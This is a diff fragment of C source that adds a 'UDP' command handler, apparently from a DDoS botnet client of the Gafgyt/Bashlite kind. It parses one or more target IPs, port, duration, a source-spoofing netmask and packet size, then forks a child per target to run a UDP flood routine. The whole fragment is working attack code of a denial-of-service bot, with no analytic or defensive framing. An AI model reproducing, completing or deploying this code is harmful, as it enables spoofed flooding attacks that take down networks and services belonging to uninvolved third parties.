@@ -1,0 +1,35 @@
+        if(!strcmp(argv[0], "UDP"))
+        {
+                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
+                {
+                        return;
+                }
+
+                unsigned char *ip = argv[1];
+                int port = atoi(argv[2]);
+                int time = atoi(argv[3]);
+                int spoofed = atoi(argv[4]);
+                int packetsize = atoi(argv[5]);
+                int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);
+
+                if(strstr(ip, ",") != NULL)
+                {
+                        unsigned char *ip = strtok(ip, ",");
+                        while(ip != NULL)
+                        {
+                                if(!listFork())
+                                {
+                                        audp(ip, port, time, spoofed, packetsize, pollinterval);
+                                        close(mainCommSock);
+                                        _exit(0);
+                                }
+                                ip = strtok(NULL, ",");
+                        }
+                } else {
+                        if (listFork()) { return; }
+                        audp(ip, port, time, spoofed, packetsize, pollinterval);
+                        close(mainCommSock);
+
+                        _exit(0);
+                }
+        }
